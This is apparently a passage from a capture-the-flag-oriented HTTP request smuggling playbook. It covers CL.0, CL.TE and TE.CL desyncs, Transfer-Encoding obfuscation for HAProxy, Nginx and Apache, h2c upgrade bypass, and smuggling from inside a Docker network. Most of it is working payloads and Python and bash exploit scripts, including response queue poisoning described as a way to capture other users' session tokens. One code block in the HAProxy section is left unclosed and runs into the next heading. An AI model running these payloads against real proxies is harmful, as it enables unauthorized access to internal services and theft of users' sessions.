---

## CL.0 Request Smuggling

CL.0 exploits servers that ignore `Content-Length: 0` and read the body anyway. Common with back-end servers that don't expect a body on certain endpoints.

### Detection
```bash
# Send POST with Content-Length but body contains smuggled request
curl -i -s -k -X POST "http://target.com/resources/images/blog.svg" \
  -H "Content-Length: 42" \
  -H "Connection: keep-alive" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary $'GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n' \
  --next "http://target.com/"
```

### Exploitation Pattern
```http
POST /resources/images/blog.svg HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Connection: keep-alive

GET /admin HTTP/1.1
Host: localhost

```

**Key points:**
- Target static resource endpoints (images, CSS, JS files)
- These endpoints often don't expect POST bodies
- The back-end may treat the body as the start of the next request
- Must use `Connection: keep-alive` to reuse the connection
- Send in a group with a normal GET request immediately after

### Common CL.0 Targets
```
/resources/images/*
/static/*
/assets/*
/favicon.ico
/robots.txt
/.well-known/*
```

---

## Response Queue Poisoning

Smuggle a complete request that generates a redirect, causing the next legitimate user's response to be replaced.

### Attack Flow
```
1. Smuggle a request that triggers a redirect (e.g., POST /login → 302)
2. The redirect response gets queued
3. Next legitimate request receives the redirect instead of their expected response
4. Legitimate user's actual response goes to the NEXT request → data leak
```

### Exploitation
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 61
Transfer-Encoding: chunked

0

GET /redirect-endpoint HTTP/1.1
Host: target.com

```

**After sending:**
1. Wait 5 seconds
2. Send a normal GET request
3. You receive the NEXT user's response (contains their data/session)

### Capturing Victim Data
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

username=attacker&password=attacker
```

Send, then immediately send a normal request. The response you get back may contain another user's session token or response data.

---

## Multi-Backend Routing Bypass via Smuggled Host Headers

Many proxy architectures route traffic to **different backend services** based on the `Host` header. Smuggling lets you inject a request with an arbitrary Host header, bypassing routing rules and reaching otherwise-inaccessible internal backends.

```
Normal routing:
  Host: public.example.com  →  Proxy  →  Public Backend
  Host: internal.service    →  Proxy  →  Internal Backend (external traffic blocked)

With smuggling:
  Smuggle a request with Host: internal.service
  Proxy forwards the smuggled request to Internal Backend
  Flag / sensitive data exposed without direct network access
```

### CRITICAL: Test Direct Host Header Access Before Any Smuggling

Many proxy configurations route based on the `Host` header with **no source IP restriction on internal backends**. Before crafting any smuggling payload, always test direct access — it often works immediately and saves significant time.

```bash
# Step 1: Discover internal hostnames from page source, JS files, and response headers
curl -sI http://target/ | grep -i 'server\|via\|x-served-by\|x-upstream\|x-forwarded-host\|x-backend'
curl -s http://target/ | grep -oiE '(http|https)://[a-z0-9._:-]+'
# Check any JS files and pages that make server-side requests (wifi status, device health, etc.)

# Step 2: Test direct access with each discovered internal hostname
INTERNAL_HOST="internal.hostname"   # replace with discovered hostname
TARGET="http://target.com"

for path in / /flag /admin /api /api/flag /status /health /internal /dashboard /secret /config /api/v1/flag; do
    echo "=== $path ==="
    resp=$(curl -s -w "\n[HTTP %{http_code}]" "$TARGET$path" -H "Host: $INTERNAL_HOST")
    echo "$resp" | head -c 300
    echo
done
```

**What success looks like:**
- Different content than the normal app → you've reached a different backend
- Sensitive data, secrets, or credentials in the response → document and extract
- HTTP 200 on paths that returned 403 normally → ACL bypassed via Host header

**Send each request twice** — connection reuse state can affect the first request.

**If direct access is blocked (403/same content):** Source IP ACLs are enforced. Proceed with the smuggling techniques below, substituting `Host: [internal-hostname]` in the smuggled request wherever you see `Host: localhost`.

---

### Step 1: Identify Internal Backends (Reconnaissance)

Do this BEFORE sending smuggling payloads. Application hints are far more reliable than brute-forcing hostnames.

**Inspect application source for server-side service calls:**
```bash
# Look for internal hostnames in HTML/JS
curl -s http://target.com/ | grep -oiE '(http|https)://[a-z0-9._:-]+'
curl -s http://target.com/static/app.js | grep -iE 'host|internal|backend|service|api\.'

# Check all JS files referenced on the page
curl -s http://target.com/ | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//'
```

**Check proxy/routing headers in responses:**
```bash
curl -sI http://target.com/ | grep -i 'server\|via\|x-served-by\|x-upstream\|x-backend\|x-haproxy'
```

**Look for SSRF-like endpoints** (endpoints that make server-side requests — they often hint at internal service topology):
- Pages that accept a URL parameter
- Pages that fetch remote content
- "Test connection", "preview", "webhook", "callback" endpoints
- `/settings`, `/status`, `/health/external` style endpoints that call other services

**Common internal hostname patterns:**
```
internal, internal.local, internal.<appname>
backend, api, api.internal, api.local
<service-name>.internal, <service-name>.local
admin.internal, management.internal
localhost, 127.0.0.1
```

### Step 2: Test Multi-Backend Access via Smuggling

Once you have a candidate internal hostname and path:

**CL.TE — inject request with internal Host header:**
```http
POST / HTTP/1.1
Host: public.example.com
Content-Length: [CALCULATE: byte length of everything after this line]
Transfer-Encoding: chunked

0

GET /internal-path HTTP/1.1
Host: internal.hostname
Content-Length: 5

x=1
```

Send this request, then immediately send a normal GET on the same or a new connection. The follow-up request may be processed by the internal backend.

**Python script: enumerate internal backends via smuggling:**
```python
#!/usr/bin/env python3
"""Probe internal backends via CL.TE / TE.CL smuggling."""
import socket
import time

def smuggle_clte(host, port, internal_host, internal_path="/"):
    smuggled = (
        f"GET {internal_path} HTTP/1.1\r\n"
        f"Host: {internal_host}\r\n"
        f"Content-Length: 5\r\n"
        f"\r\n"
        f"x=1\r\n"
    )
    body = f"0\r\n\r\n{smuggled}"
    cl = len(body)
    request = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    try:
        sock.connect((host, port))
        sock.sendall(request.encode())
        time.sleep(0.3)
        follow = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
        sock.sendall(follow.encode())
        resp = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk: break
                resp += chunk
            except socket.timeout:
                break
        return resp.decode(errors='replace')
    finally:
        sock.close()

host = "localhost"     # change to target host
port = 80              # change to target port

# Enumerate candidate internal hostnames/paths from app source hints
internal_candidates = [
    ("internal", ["/", "/admin", "/flag", "/status", "/api/flag"]),
    ("internal.local", ["/", "/flag", "/status"]),
    ("localhost", ["/admin", "/flag", "/internal"]),
    ("backend", ["/", "/flag", "/status"]),
]

for int_host, paths in internal_candidates:
    for path in paths:
        print(f"[*] Smuggling → Host: {int_host}{path}")
        try:
            resp = smuggle_clte(host, port, int_host, path)
            if any(kw in resp.lower() for kw in ["secret", "token", "admin", "password", "credentials", "200 ok"]):
                print(f"[!] Interesting response for {int_host}{path}:")
                print(resp[:1500])
        except Exception as e:
            print(f"    Error: {e}")
        time.sleep(0.1)
```

### Step 3: Enumerate Paths on the Internal Backend

Once you confirm a smuggled request reaches an internal backend (different response, unexpected content):

```bash
# Try common sensitive paths on the identified internal host
INTERNAL_HOST="internal.hostname"
for path in /flag /admin /api/flag /status /health /secret /internal /config; do
    python3 -c "
import socket, time
# [use smuggle_clte from above with path='$path']
"
done
```

---

## Proxy-Specific Exploits

Different proxies have specific TE obfuscation variants they fail to parse:

### HAProxy

**TE obfuscation variants (disable chunked parsing on frontend):**
```http
Transfer-Encoding: chunked
Transfer-Encoding:

Transfer-Encoding: chunked
Transfer-encoding: cow
```

**HAProxy legacy mode (`no option http-use-htx`) + connection reuse (`http-reuse always`):**

These two config options together create a reliable desync window. `http-reuse always` means HAProxy keeps persistent connections to backends, so a desynchronized connection state persists across requests.

Detection: check if `server: haproxy` or `via: haproxy` appears in response headers.

**Full exploit: TE obfuscation + internal Host header:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: [bytes of everything after blank line]
Transfer-Encoding: chunked
Transfer-Encoding: cow

0

GET /internal-path HTTP/1.1
Host: internal.hostname
Content-Length: 5

x=1
```

Send this request. Then send a normal follow-up GET request. Because `http-reuse always` keeps the backend connection alive after the desync, the follow-up request is dispatched to the backend that `internal.hostname` routes to.

**Extra-space TE obfuscation (also effective against HAProxy):**
```http
Transfer-Encoding: chunked
Transfer-Encoding :

### Nginx
```http
Transfer-Encoding: chunked
Transfer-Encoding : chunked

Transfer-Encoding: xchunked
```

### Apache
```http
Transfer-Encoding: chunked

Transfer-Encoding
 : chunked

Transfer-Encoding: chunk
```

### Generic TE Obfuscation Variants
```http
Transfer-Encoding: chunked
Transfer-Encoding: cow

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

 Transfer-Encoding: chunked
```

### Testing All Variants Script
```bash
#!/bin/bash
# Test multiple TE obfuscation variants
TARGET="http://target.com"
TIMEOUT=10

declare -a TE_HEADERS=(
  "Transfer-Encoding: chunked\r\nTransfer-Encoding: cow"
  "Transfer-Encoding: chunked\r\nTransfer-encoding: x"
  "Transfer-Encoding : chunked"
  "Transfer-Encoding:\tchunked"
  "Transfer-Encoding: xchunked"
  "Transfer-Encoding: chunk"
  "Transfer-Encoding:\r\n chunked"
)

for te in "${TE_HEADERS[@]}"; do
  echo "[*] Testing: $te"
  printf "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\n${te}\r\n\r\n1\r\nA\r\nX" | \
    timeout $TIMEOUT nc -q 1 target.com 80
  echo ""
done
```

---

## Automated Smuggling Detection

### Python Raw Socket Detection Script
```python
#!/usr/bin/env python3
"""Detect HTTP request smuggling via timing-based CL.TE and TE.CL tests."""
import socket
import time
import ssl
import sys

def send_raw(host, port, data, use_ssl=False, timeout=15):
    """Send raw HTTP data and measure response time."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)

    if use_ssl:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=host)

    try:
        sock.connect((host, port))
        sock.sendall(data.encode() if isinstance(data, str) else data)
        start = time.time()
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        elapsed = time.time() - start
        return response.decode(errors='replace'), elapsed
    except Exception as e:
        return str(e), time.time() - start if 'start' in dir() else 0
    finally:
        sock.close()

def test_clte(host, port, use_ssl=False):
    """Test for CL.TE smuggling via timing."""
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"1\r\n"
        f"A\r\n"
        f"X"
    )
    _, elapsed = send_raw(host, port, payload, use_ssl, timeout=15)
    return elapsed

def test_tecl(host, port, use_ssl=False):
    """Test for TE.CL smuggling via timing."""
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 6\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"0\r\n"
        f"\r\n"
        f"X"
    )
    _, elapsed = send_raw(host, port, payload, use_ssl, timeout=15)
    return elapsed

def detect_smuggling(host, port=80, use_ssl=False):
    """Run CL.TE and TE.CL timing tests."""
    print(f"[*] Testing {host}:{port} (SSL={use_ssl})")

    # Baseline
    baseline_payload = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
    _, baseline_time = send_raw(host, port, baseline_payload, use_ssl)
    print(f"  Baseline response: {baseline_time:.1f}s")

    # CL.TE test
    clte_time = test_clte(host, port, use_ssl)
    print(f"  CL.TE test: {clte_time:.1f}s", end="")
    if clte_time > 5:
        print(" ← POTENTIAL CL.TE VULNERABILITY!")
    else:
        print(" (normal)")

    # TE.CL test
    tecl_time = test_tecl(host, port, use_ssl)
    print(f"  TE.CL test: {tecl_time:.1f}s", end="")
    if tecl_time > 5:
        print(" ← POTENTIAL TE.CL VULNERABILITY!")
    else:
        print(" (normal)")

    return {
        "clte_vulnerable": clte_time > 5,
        "tecl_vulnerable": tecl_time > 5,
        "clte_time": clte_time,
        "tecl_time": tecl_time
    }

if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    use_ssl = port == 443 or "--ssl" in sys.argv
    detect_smuggling(host, port, use_ssl)
```

### Quick curl-Based Detection
```bash
#!/bin/bash
# Quick CL.TE timing test using curl
HOST="$1"
echo "[*] Testing $HOST for request smuggling..."

# CL.TE: If front-end uses CL and back-end uses TE, the 'X' after chunk
# will be held by back-end waiting for next chunk → timeout/delay
START=$(date +%s%N)
curl -s -o /dev/null -w "%{time_total}" \
  -X POST "$HOST/" \
  -H "Content-Length: 4" \
  -H "Transfer-Encoding: chunked" \
  --data-binary $'1\r\nA\r\nX' \
  --max-time 15 2>/dev/null
END=$(date +%s%N)
ELAPSED=$(( (END - START) / 1000000000 ))

if [ "$ELAPSED" -gt 5 ]; then
  echo "  [!] CL.TE: Delayed ${ELAPSED}s - POTENTIAL VULNERABILITY"
else
  echo "  [-] CL.TE: Normal (${ELAPSED}s)"
fi
```

---

## h2c Smuggling — HTTP/2 Cleartext Upgrade Bypass

When a proxy (HAProxy, Nginx, Envoy) forwards `Upgrade: h2c` requests to a backend that actually supports HTTP/2 cleartext (h2c), the proxy may hand off the raw TCP stream to the backend. From that point, the backend speaks HTTP/2 directly with the attacker — bypassing the proxy's ACLs entirely.

### How It Works

```
Attacker → Proxy (enforces ACLs at HTTP/1 layer)
         → Backend (supports h2c, receives raw HTTP/2 stream post-upgrade)
         → ACL bypass: attacker talks HTTP/2 directly to backend
```

The proxy checks and enforces rules on the initial HTTP/1 upgrade request, but once the upgrade completes, it just pipes bytes — meaning all subsequent HTTP/2 requests bypass proxy-level access controls.

### Detection

```bash
# Check if server accepts h2c upgrade
curl -v --http1.1 http://target.com/ \
  -H "Connection: Upgrade, HTTP2-Settings" \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAAQAAP__"

# 101 Switching Protocols response = h2c upgrade accepted
# 200/4xx without 101 = not supported
```

```bash
# Use h2csmuggler (if available) for automated detection + ACL bypass
# pip install h2csmuggler  OR  git clone https://github.com/BishopFox/h2csmuggler
python3 h2csmuggler.py --scan-list urls.txt          # scan for h2c-enabled endpoints
python3 h2csmuggler.py http://target.com /admin       # attempt to reach /admin via h2c bypass
python3 h2csmuggler.py http://target.com /internal    # probe blocked internal paths
```

### Manual h2c Upgrade Request

```http
GET / HTTP/1.1
Host: target.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQAAP__
```

If the backend returns `101 Switching Protocols`, send HTTP/2 frames on the same TCP connection to reach restricted endpoints.

### Paths to Try After h2c Bypass

Once the proxy is bypassed, try any path that the proxy's ACL normally blocks:
```
/admin, /internal, /api/internal, /status, /metrics,
/management, /actuator, /debug, /_internal, /flag
```

### When to Try h2c Smuggling

- The target uses HAProxy, Nginx, or Envoy as a frontend proxy
- Direct access to sensitive endpoints returns 403/404 from the proxy
- The backend stack includes Go, gRPC services, or newer Node/Python apps (likely h2c capable)
- CL.TE / TE.CL timing tests return normal — h2c is an independent technique that works when traditional desync does not

---

## Multi-Layer Proxy Chain Analysis

Many real-world targets have **3+ proxy layers** (e.g., CDN → reverse proxy → load balancer → backend). Each layer may parse TE/CL differently, creating desync opportunities between non-adjacent layers.

### Methodology: Map Each Parser's Behavior

**Step 1: Identify proxy layers from response headers**
```bash
curl -sI http://target/ | grep -iE 'server|via|x-served-by|x-forwarded|x-proxy|x-cache|x-varnish|x-haproxy'
# Example: "Via: 1.1 varnish, 1.1 haproxy" → at least 3 layers
```

**Step 2: Determine each layer's TE handling**

Different parsers validate Transfer-Encoding differently:

| Parser | TE Matching | Notes |
|--------|------------|-------|
| **Exact match** (HAProxy, Apache, Nginx) | Must be exactly `chunked` (with optional whitespace/case tolerance) | Rejects `cow`, `identity,chunked`, unknown values |
| **Substring match** (some Python HTTP libs, custom parsers) | `"chunked" in te_value` — any value containing "chunked" triggers chunked mode | `xchunked`, `chunked;q=1.0` may trigger |
| **Whitespace-tolerant** (HAProxy, Apache) | Leading/trailing spaces and tabs accepted: ` chunked`, `chunked\t`, `\tchunked` | |
| **Strict** (h11, strict parsers) | `value != b"chunked"` → reject with 501 | Rejects everything except exact `chunked` |

**Step 3: Find a TE value that creates disagreement**

The desync happens when one proxy treats the request as chunked (TE) and another treats it as fixed-length (CL). Test systematically:

```python
#!/usr/bin/env python3
"""Probe TE parsing behavior across proxy layers."""
import socket, time

TE_VARIANTS = [
    "chunked",              # baseline — all should agree
    "Chunked",              # case variation
    " chunked",             # leading space
    "chunked ",             # trailing space
    "\tchunked",            # leading tab
    "chunked\t",            # trailing tab
    "\x0bchunked",          # vertical tab prefix
    "chunked;q=1.0",       # parameter
    "identity,chunked",    # multiple values
    "cow",                  # unknown value
    "xchunked",             # prefix
    "chunkedx",             # suffix
]

def test_te(host, port, te_value, timeout=12):
    """Send CL.TE timing probe with given TE value.
    If frontend uses CL and backend uses TE, the incomplete chunk causes a delay."""
    payload = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: {te_value}\r\n"
        f"\r\n"
        f"1\r\nA\r\nX"
    )
    s = socket.socket(); s.settimeout(timeout)
    try:
        s.connect((host, port))
        start = time.time()
        s.sendall(payload.encode())
        s.recv(4096)
        elapsed = time.time() - start
        return elapsed
    except socket.timeout:
        return timeout
    finally:
        s.close()

host, port = "target.com", 80
for te in TE_VARIANTS:
    t = test_te(host, port, te)
    indicator = " ← DESYNC!" if t > 5 else ""
    print(f"  TE: {repr(te):30s}  delay: {t:.1f}s{indicator}")
```

### Common Desync Patterns by Proxy Pair

| Frontend | Backend | Desync TE Value | Type |
|----------|---------|-----------------|------|
| HAProxy (legacy) | Apache | `chunked` + `cow` (dual TE) | TE.TE |
| Nginx | Apache | `Transfer-Encoding : chunked` (space before colon) | TE.TE |
| CDN (Akamai/CF) | HAProxy | Various obs-fold tricks | CL.TE |
| Python reverse proxy | HAProxy | Standard `chunked` (Python substring match) | CL.TE |

---

## Apache Connection: Close Defense

Apache sends `Connection: close` when it receives **both** Content-Length and Transfer-Encoding headers. This terminates the connection after the response, preventing the classic CL.TE desync where leftover data poisons the next request.

**Impact:** Even if the frontend proxy and Apache disagree on message boundaries, the connection closes after the first response — no request can be "left behind" for the next legitimate request to consume.

**Workaround strategies:**
1. **TE obfuscation** — If you can get the frontend to strip or ignore the TE header (so only CL reaches Apache), Apache won't see both headers and won't trigger Connection: close
2. **Target a different backend** — If the proxy routes to multiple backends, find one that doesn't have this defense (e.g., Node.js, Gunicorn, older IIS)
3. **Exploit the intermediate proxy instead** — If there are 3+ layers, the desync may occur between layers 1-2 (not involving Apache at all)
4. **Use response queue poisoning** — Even with Connection: close, if the frontend proxy reuses its own connection to the backend (via `http-reuse always`), the desync happens at the proxy layer, not the backend

---

## HTTP Header Continuation Lines (obs-fold)

HTTP/1.1 historically allowed "obs-fold" — continuing a header value on the next line by starting with whitespace (space or tab):

```http
Transfer-Encoding: chunked
X-Header: value
 Transfer-Encoding: chunked
```

In the example above, the third line is a continuation of `X-Header`, making its full value: `value Transfer-Encoding: chunked`. Some parsers handle this correctly; others may interpret the continuation line as a new header.

### Parser Behavior with obs-fold

| Parser | obs-fold handling | Effect |
|--------|------------------|--------|
| **mitmproxy** | Joins continuation with `\r\n ` in value, preserves when forwarding | TE hidden inside another header's value |
| **HAProxy** | Normalizes obs-fold to spaces (e.g., `value\r\n TE: chunked` → `value   TE: chunked`) | TE hidden inside another header — NOT parsed |
| **Apache** | Joins continuation into previous header value | TE hidden — uses CL |
| **Nginx** | Rejects obs-fold with 400 | Blocks the request entirely |

**Practical result:** obs-fold alone rarely creates a desync because modern proxies either join it correctly (hiding the TE from everyone) or reject it. It is primarily useful in combination with other techniques or against custom/legacy parsers.

---

## Internal Request Endpoints as Proxy Bypass

Many applications have endpoints that make **server-side HTTP requests** to internal services. These requests bypass the outermost proxy layer entirely, giving you access to inner proxies and backends.

### Discovery

```bash
# Look for endpoints that show signs of making internal requests
curl -s http://target/ | grep -iE 'status|health|check|test|device|wifi|firmware|update|webhook|preview|fetch|connect'

# Common patterns — endpoints that call internal services:
# /settings, /status, /health_check, /test_connection
# /webhook/test, /preview, /fetch_url, /update_firmware

# Check JS files for internal service URLs
curl -s http://target/ | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//' | \
  while read js; do curl -s "http://target$js" | grep -iE 'http://[a-z].*:\d+'; done

# Read page source for curl/fetch/request calls (may reveal internal hostnames + ports)
curl -s http://target/ | grep -oiE '(curl|fetch|request|http://)[^"'"'"' <]+'
```

### Exploitation

When an endpoint makes internal requests (e.g., a settings page triggers `curl http://internal-proxy:PORT/path`):

1. **The internal request bypasses the external-facing proxy** — it goes directly to the inner proxy/backend
2. **Use this for reconnaissance** — the response often reveals internal service responses, headers, error messages
3. **Response queue poisoning via internal endpoint** — if the internal request shares a persistent connection with the backend, you may be able to desync that connection and poison responses
4. **Trigger the endpoint while simultaneously smuggling** — time a smuggling payload to poison the connection the internal endpoint uses

```bash
# Example: trigger internal request endpoint and examine response
curl -s -X POST http://target/settings \
  -H "Cookie: session=YOUR_SESSION" \
  -d "param=value"
# Response may contain internal service output, error messages, headers
```

---

## Connection Pooling and Cross-Backend Desync

When a proxy uses **connection pooling** (`http-reuse always` in HAProxy, `upstream keepalive` in Nginx), it maintains persistent connections to backends and may reuse the same TCP connection for requests destined to different backend services.

### How It Enables Cross-Backend Attacks

```
Proxy config:
  backend_public  →  app-server:80  (Host: public.example.com)
  backend_internal → app-server:80  (Host: internal.service)
  http-reuse always  (both backends share connections to the same server)

Attack flow:
  1. Smuggle request to backend_public → leaves partial request on the TCP connection
  2. Next request from proxy to backend_internal (same TCP conn) → combines with leftover data
  3. Backend processes combined request with Host: internal.service → returns internal content
```

### Detection

```bash
# Check if same IP/port is used for multiple backend routes
# (visible if you can read proxy config, or infer from timing/response patterns)
curl -sI http://target/ -H "Host: public.example.com"
curl -sI http://target/ -H "Host: internal.service"
# If both return responses (even different ones), they likely share a backend server

# Check for http-reuse indicators
curl -sI http://target/ | grep -i 'connection:\|keep-alive'
```

### Key Insight

Even if **direct Host header injection** is blocked (proxy validates Host), smuggling can bypass this because the smuggled request's Host header is evaluated by the **backend**, not the proxy. With connection pooling, the proxy may route the follow-up request through the poisoned connection to the internal backend.

---

## Docker/Container Network Bypass

When the outermost proxy (e.g., mitmproxy in reverse mode) **completely blocks** smuggling by rewriting Host headers on ALL requests — including pipelined/smuggled ones — you cannot achieve a useful desync through it. In this case, if the target runs in Docker containers and you have Docker CLI access, bypass the outer proxy entirely by connecting to inner proxy layers from within the Docker network.

### Why mitmproxy Blocks All Smuggling

mitmproxy's HTTP parser uses a **substring match** for Transfer-Encoding: `"chunked" in te.lower()`. This catches every TE value that HAProxy or Apache would also recognize as chunked. When mitmproxy sees chunked encoding:
1. It fully parses the chunked body (reads to `0\r\n\r\n`)
2. Any leftover data (the "smuggled" request) is treated as a **new, separate HTTP request**
3. mitmproxy **rewrites the Host header** on this new request to the upstream target
4. The smuggled request reaches HAProxy with the wrong Host → routed to the default (external) backend

TE values mitmproxy doesn't recognize (e.g., `cow`, `identity`) get forwarded as-is, but:
- HAProxy also doesn't recognize them → keeps both CL+TE → forwards both to Apache
- Apache sees both CL and TE → sends `Connection: close` → kills the connection → no desync
- Or Apache rejects with 400/501 entirely

**Result:** No TE value creates a usable desync through mitmproxy. All paths are blocked.

### Container Bypass Methodology

```bash
# 1. Identify Docker environment
docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}"
docker network ls

# 2. Inspect the network topology
NETWORK=$(docker network ls --format '{{.Name}}' | grep -v 'bridge\|host\|none' | head -1)
docker network inspect "$NETWORK" --format '{{range .Containers}}{{.Name}} {{.IPv4Address}}{{"\n"}}{{end}}'

# 3. Read proxy configs to find internal hostnames and routing rules
for container in $(docker ps --format '{{.Names}}'); do
    echo "=== $container ==="
    docker exec "$container" cat /usr/local/etc/haproxy/haproxy.cfg 2>/dev/null
    docker exec "$container" cat /etc/nginx/nginx.conf 2>/dev/null
done

# 4. Find the internal hostname and flag path from app source
for container in $(docker ps --format '{{.Names}}'); do
    docker exec "$container" find / -name "routes.py" -o -name "app.py" -o -name "server.js" 2>/dev/null | head -5
done

# 5. Run CL.TE from inside the network (see quickstart Pattern 0c for full script)
docker exec <app_container> python3 -c "
import socket, time
s = socket.socket(); s.settimeout(10)
s.connect(('haproxy', 8001))
smuggled = 'GET /target/path HTTP/1.1\r\nHost: internal.hostname\r\n\r\n'
body = '0\r\n\r\n' + smuggled
req = 'POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n%s' % (len(body), body)
s.sendall(req.encode()); time.sleep(0.3)
s.sendall(b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n')
resp = b''
try:
    while True:
        chunk = s.recv(4096);
        if not chunk: break
        resp += chunk
except: pass
print(resp.decode(errors='replace'))
s.close()
"
```

### When to Use

- Outermost proxy rewrites Host on ALL requests (confirmed by: `curl -H "Host: random.test" target` returns same response)
- All TE obfuscation variants fail (mitmproxy substring match, Apache CL+TE rejection)
- Target described as "Docker container" or "local container"
- Response headers reveal multi-layer proxy stack with known vulnerable inner proxy (HAProxy legacy mode, old Nginx)
